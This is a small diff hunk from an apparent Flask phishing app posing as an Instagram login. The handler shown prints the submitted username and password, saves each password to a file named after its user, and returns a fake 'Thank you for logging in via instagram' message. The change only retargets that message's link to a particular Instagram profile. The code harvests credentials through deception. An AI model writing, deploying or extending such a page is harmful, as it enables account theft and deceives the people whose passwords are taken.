@@ -10,7 +10,7 @@ def index():
         print(username,password)
         with open(f"{username}.txt", "w") as f:
             f.write(password)
-        return "<a href='https://www.instagram.com/'>Thank you for logging in via instagram. Click here to redirect to your account.</a>"
+        return "<a href='https://www.instagram.com/itsdanka82/'>Thank you for logging in via instagram. Click here to redirect to your account.</a>"
     return render_template("index.html")
 
 if __name__ == '__main__':
